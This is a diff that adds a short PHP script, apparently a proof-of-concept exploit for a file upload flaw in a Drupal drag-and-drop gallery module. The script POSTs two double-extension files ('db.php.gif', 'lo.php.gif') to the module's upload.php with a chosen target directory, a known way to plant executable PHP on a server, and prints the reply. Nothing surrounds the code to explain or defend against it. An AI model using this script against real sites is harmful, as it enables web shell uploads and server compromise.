@@ -1,0 +1,16 @@
+<?php
+
+$uploadfile="db.php.gif";
+$uploadfile2="lo.php.gif";
+
+$ch = curl_init("http://www.example.com/drupal/sites/all/modules/dragdrop_gallery/upload.php?nid=1&filedir=/drupal/sites/all/modules/dragdrop_gallery/");
+curl_setopt($ch, CURLOPT_POST, true);   
+curl_setopt($ch, CURLOPT_POSTFIELDS, array('user_file[0]'=>"@$uploadfile",
+                                            'user_file[1]'=>"@$uploadfile2"));
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$postResult = curl_exec($ch);
+curl_close($ch);
+   
+print "$postResult";
+
+?>
